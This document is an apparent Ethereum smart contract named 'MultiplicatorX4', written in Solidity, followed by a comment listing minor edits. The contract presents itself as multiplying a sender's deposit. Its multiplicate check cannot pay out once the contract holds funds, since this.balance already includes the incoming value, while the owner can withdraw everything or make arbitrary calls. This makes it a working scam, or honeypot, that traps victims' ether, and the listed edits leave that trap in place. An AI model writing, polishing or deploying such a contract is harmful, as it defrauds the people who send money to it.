pragma solidity ^0.4.18;

contract MultiplicatorX4 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address adr, bytes data) public payable {
        require(msg.sender == owner);
        require(adr != address(0));

        bool success = adr.call.value(msg.value)(data);
        require(success);
    }

    function multiplicate(address adr) public payable {
        require(adr != address(0));
        if (msg.value >= this.balance) {
            adr.transfer(this.balance + msg.value);
        }
    }
}

// Changes Made:
// - Changed Owner variable to lower case 'owner'
// - Added require statement to check if 'adr' is not equal to 0x0 in command function
// - Added require statement to check if the low level call in command function was successful
// - Added require statement to check if 'adr' is not equal to 0x0 in multiplicate function